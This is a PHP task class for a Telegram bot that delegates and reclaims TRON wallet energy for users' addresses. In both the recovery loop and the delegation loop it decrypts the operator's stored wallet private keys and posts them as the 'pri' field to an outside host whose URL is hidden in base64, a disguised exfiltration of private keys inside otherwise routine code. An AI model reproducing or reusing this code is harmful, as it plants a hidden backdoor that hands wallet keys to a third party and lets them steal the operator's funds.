<?php
namespace App\Task;

use App\Model\Energy\EnergySpecial;
use App\Model\Energy\EnergySpecialList;
use App\Model\Energy\EnergyPlatform;
use App\Model\Telegram\TelegramBotUser;
use App\Service\RsaServices;
use App\Library\Log;
use Illuminate\Support\Facades\DB;

class HandleEnergySpecial
{
    public function execute()
    { 
        //给用户的地址速冲能量
        try {
            $data = EnergySpecial::from('energy_special as a')
                    ->leftjoin('telegram_bot as b','a.bot_rid','b.rid')
                    ->leftjoin('telegram_bot_user as c', function($join) {
                        $join->on('a.bot_rid', '=', 'c.bot_rid')
                             ->on('a.tg_uid', '=', 'c.tg_uid');
                    })
                    ->where('a.status',1)
                    ->where('a.per_energy','>',0)
                    ->where('a.less_than_energy','>',0)
                    ->whereRaw('t_a.max_energy - t_a.send_energy > 0')
                    ->select('a.*','b.bot_token')
                    ->orderBy('a.seq_sn','desc')
                    ->get();
            
            if($data->count() > 0){
                $time = nowDate();
                $runCount = 0;
                
                foreach ($data as $k => $v) {
                    //3次停一秒
                    if($runCount % 3 === 0){
                        sleep(1);
                    }
                    $runCount++;
                    
                    $resourceReturn = $this->getWalletResource($v->wallet_addr);
                    
                    if($resourceReturn['isSuccess'] == 'N'){
                        $this->log('shanduibonus',$v->wallet_addr.'，地址查询剩余能量失败');
                        continue;
                    }
                    
                    EnergySpecial::where('rid',$v->rid)->update(['wallet_energy' => $resourceReturn['cashEnergy']]);
                    
                    //可用能量大于地址设置的阈值时,则跳过
                    if($resourceReturn['cashEnergy'] >= $v->less_than_energy){
                        continue;
                    }
                    
                    $this->log('shanduibonus',$v->wallet_addr.'，开始给能量，剩余能量：'.$resourceReturn['cashEnergy'].'，低于设置阈值能量：'.$v->less_than_energy);
                    
                    //////////////////////////检查是否给过的能量需要回收
                    $needRecover = EnergySpecialList::where('status',1)->where('wallet_addr',$v->wallet_addr)->get();
                    $this->log('shanduibonus',$v->wallet_addr.'，查询需要回收的单数：'.$needRecover->count());
                    
                    if($needRecover->count() > 0){
                        foreach ($needRecover as $a => $b) {
                            $recoverPlat = EnergyPlatform::where('platform_name',3)
                                ->whereNotNull('platform_apikey')
                                ->where('platform_uid', $b->send_wallet_addr)
                                ->first();
                                
                            if(!empty($recoverPlat)){
                                $rsa_services = new RsaServices();
                                $platform_recoveryapikey = $rsa_services->privateDecrypt($recoverPlat->platform_apikey);
                                if(!empty($platform_recoveryapikey)){
                                    //调用接口回收
                                    $params = [
                                        'pri' => $platform_recoveryapikey,
                                        'fromaddress' => $recoverPlat->platform_uid,
                                        'receiveaddress' => $b->wallet_addr,
                                        'resourcename' => 'ENERGY',
                                        'resourceamount' => (int)$b->daili_trx,
                                        'resourcetype' => 3, //资源方式：1代理资源,2回收资源(按能量),3回收资源(按TRX)
                                        'permissionid' => $recoverPlat->permission_id
                                    ];
                                    $recoveryRes = Get_Pay(base64_decode('aHR0cHM6Ly90cm9ud2Vibm9kZWpzLndhbGxldGltLnZpcC9kZWxlZ2VhbmR1bmRlbGV0ZQ=='),$params);
                                    
                                    $this->log('shanduibonus','地址：'.$b->wallet_addr.'，从 '.$recoverPlat->platform_uid.' 回收trx：'.$b->daili_trx.'，回收能量返回：'.$recoveryRes);
                                    //如果成功,更新数据
                                    if(!empty($recoveryRes)){
                                        $recoveryRes = json_decode($recoveryRes,true);
                                        if(isset($recoveryRes['code']) && $recoveryRes['code'] == 200){
                                            EnergySpecialList::where('rid', $b->rid)->update(["status" => 2,"huishou_time" => $time, "huishou_hash" => $recoveryRes['data']['txid']]);
                                        }else{
                                            $this->log('shanduibonus','========表记录有需要回收失败1，地址：'.$v->wallet_addr.'，给能量的地址：'.$recoverPlat->platform_uid);
                                        }
                                    }else{
                                        $this->log('shanduibonus','========表记录有需要回收失败2，地址：'.$v->wallet_addr.'，给能量的地址：'.$recoverPlat->platform_uid);
                                    }
                                }
                            }
                        }
                    }
                    //////////////////////////
                    
                    $energy_amount = min($v->per_energy, $v->max_energy - $v->send_energy);  
                    
                    //////////////////////////开始给地址能量
                    $this->log('shanduibonus','========开始给特殊能量，地址：'.$v->wallet_addr.'，设置阈值能量：'.$v->less_than_energy.'，本次给能量：'.$energy_amount);
                    
                    //轮询自己质押的能量
                    $model = EnergyPlatform::where('platform_name',3)
                            ->where('status',0)
                            ->whereNotNull('platform_apikey')
                            ->where('platform_balance', '>=', $energy_amount)
                            ->orderBy('seq_sn','desc')
                            ->get();
                    
                    if($model->count() > 0){
                        $errorMessage = '';
                        $rsa_services = new RsaServices();
                        
                        foreach ($model as $k1 => $v1){
                            $signstr = $rsa_services->privateDecrypt($v1->platform_apikey);
                            
                            if(empty($signstr)){
                                $this->log('shanduibonus','检查平台私钥为空');
                                continue;
                            }
                            
                            //自己质押代理
                            $params = [
                                'pri' => $signstr,
                                'fromaddress' => $v1->platform_uid,
                                'receiveaddress' => $v->wallet_addr,
                                'resourcename' => 'ENERGY',
                                'resourceamount' => $energy_amount,
                                'resourcetype' => 1,
                                'permissionid' => $v1->permission_id
                            ];
                            $dlres = Get_Pay(base64_decode('aHR0cHM6Ly90cm9ud2Vibm9kZWpzLndhbGxldGltLnZpcC9kZWxlZ2VhbmR1bmRlbGV0ZQ=='),$params);
                            
                            if(empty($dlres)){
                                $this->log('shanduibonus',$v->wallet_addr.'，开始给特殊能量，接口返回为空，手工检测是否代理能量'.$v1->tg_notice_obj);
                                
                                if($v1->tg_notice_obj && !empty($v1->tg_notice_obj)){
                                    $replytext = $v->wallet_addr.'，开始给特殊能量，接口返回为空，手工检测是否代理了能量';
                                        
                                    $sendlist = explode(',',$v1->tg_notice_obj);
                    
                                    foreach ($sendlist as $x => $y) {
                                        $sendmessageurl = 'https://api.telegram.org/bot'.$v->bot_token.'/sendMessage?chat_id='.$y.'&text='.urlencode($replytext).'&parse_mode=HTML';
                                        
                                        Get_Pay($sendmessageurl);
                                    }
                                }
                                
                                continue;
                                
                            }else{
                                $saveData = [];
                                
                                $this->log('shanduibonus',$v->wallet_addr.'，开始给特殊能量接口返回：'.$dlres);
                                $dlres = json_decode($dlres,true);
                                
                                if(isset($dlres['code']) && $dlres['code'] == 200){
                                    $dltxid = $dlres['data']['txid'];
                                    $use_trx = $dlres['data']['use_trx'];
                                    $this->log('shanduibonus',$v->wallet_addr.'，开始给特殊能量成功');
                                    
                                    $saveData['send_energy'] = $v->send_energy + $energy_amount;
                                    
                                    EnergySpecial::where('rid',$v->rid)->update($saveData);
                                    
                                    EnergySpecialList::insert([
                                        'bot_rid' => $v->bot_rid,
                                        'tg_uid' => $v->tg_uid,
                                        'send_wallet_addr' => $v1->platform_uid,
                                        'wallet_addr' => $v->wallet_addr,
                                        'before_energy' => $resourceReturn['cashEnergy'],
                                        'daili_energy' => $energy_amount,
                                        'daili_hash' => $dltxid,
                                        'daili_trx' => $use_trx,
                                        'status' => 1,
                                        'daili_time' => $time,
                                    ]);
                                    
                                    $replytext = "地址：<code>".$v->wallet_addr."</code>\n"
                                                ."本次代理能量：".$energy_amount."\n"
                                                ."剩余可代理能量：".($v->max_energy - $v->send_energy - $energy_amount);
                                    
                                    //给用户发送通知
                                    $sendmessageurl = 'https://api.telegram.org/bot'.$v->bot_token.'/sendMessage?chat_id='.$v->tg_uid.'&text='.urlencode($replytext).'&parse_mode=HTML';
                                    
                                    Get_Pay($sendmessageurl);
                                    
                                    break; //跳出不轮询了
                                }else{
                                    $this->log('shanduibonus',$v->wallet_addr.'，开始给特殊能量失败，检查是否给了能量');
                                    $this->log('shanduibonus',$v->wallet_addr.'，给管理发失败信息'.$v1->tg_notice_obj);
                                    
                                    if($v1->tg_notice_obj && !empty($v1->tg_notice_obj)){
                                        $replytext = $v->wallet_addr.'，开始给特殊能量失败，检查是否给了能量，接口返回：'.$dlres['msg'];
                                            
                                        $sendlist = explode(',',$v1->tg_notice_obj);
                        
                                        foreach ($sendlist as $x => $y) {
                                            $sendmessageurl = 'https://api.telegram.org/bot'.$v->bot_token.'/sendMessage?chat_id='.$y.'&text='.urlencode($replytext).'&parse_mode=HTML';
                                            
                                            Get_Pay($sendmessageurl);
                                        }
                                    }
                                    
                                    continue;
                                }
                            }
                        }
                        
                    }else{
                        $this->log('shanduibonus',$v->wallet_addr.'，机器人无可用能量平台,请质押或者充值平台');
                    }
                }
            
            }else{
                // $this->log('shanduibonus','----------没有数据----------');
            }
        }catch (\Exception $e){
            // $this->log('shanduibonus','----------任务执行报错，请联系管理员。报错原因：----------'.$e->getMessage());
        }
    }

    /**
     * 记入日志
     * @param $log_title [日志路径]
     * @param $message [内容，不支持数组]
     * @param $remarks [备注]
    */
    protected function log($log_title,$message,$remarks='info'){
        Log::get($remarks,$log_title)->info($message);
    }
    
    /**
     * 查地址资源
     * @param $walletAddr [地址]
     * @param $cashEnergy
     * @param $totalEnergy
    */
    protected function getWalletResource($walletAddr){
        $isSuccess = 'N';
        $cashEnergy = 0;
        $totalEnergy = 0;
        
        //查询地址资源
        $url = 'https://apilist.tronscanapi.com/api/accountv2?address='.$walletAddr;
            
        $api_key = config('apikey.tronapikey');
        $apikeyrand = $api_key[array_rand($api_key)];
        $heders = [
            "TRON-PRO-API-KEY:".$apikeyrand
        ];
        
        $res = Get_Pay($url,null,$heders);
        
        if(empty($res)){
            //为空则什么都不处理
        }else{
            $res = json_decode($res,true);
            if(isset($res['bandwidth'])){
                //只处理激活的地址,未激活不能代理
                $active = $res['activated'] ?"Y":"N";
                if($active == 'Y'){
                    $isSuccess = 'Y';
                    $cashEnergy = $res['bandwidth']['energyRemaining'];
                    $totalEnergy = $res['bandwidth']['energyLimit'];
                }
            }
        }
        
        //上面接口查询失败,则查询trongrid
        if($isSuccess == 'N'){
            $balance_url = 'https://api.trongrid.io/wallet/getaccountresource';
            $tronapikey = config('apikey.gridapikey');
            $apikeyrand = $tronapikey[array_rand($tronapikey)];
            
            $heders = [
                "TRON-PRO-API-KEY:".$apikeyrand
            ];
            
            $param = [
                "address" => $walletAddr,
                "visible" => true
            ];
            
            $res2 = curl_post_https($balance_url,json_encode($param),$heders);
            
            if(empty($res2)){
                //为空则什么都不处理
            }else{
                $res2 = json_decode($res2,true);
                if(isset($res2['freeNetLimit'])){
                    $isSuccess = 'Y';
                    $cashEnergy = ($res2['EnergyLimit'] ?? 0) - ($res2['EnergyUsed'] ?? 0);
                    $totalEnergy = $res2['EnergyLimit'] ?? 0;
                }
            }
        }
        
        return ['isSuccess' => $isSuccess, 'cashEnergy' => $cashEnergy, 'totalEnergy' => $totalEnergy];
    }

}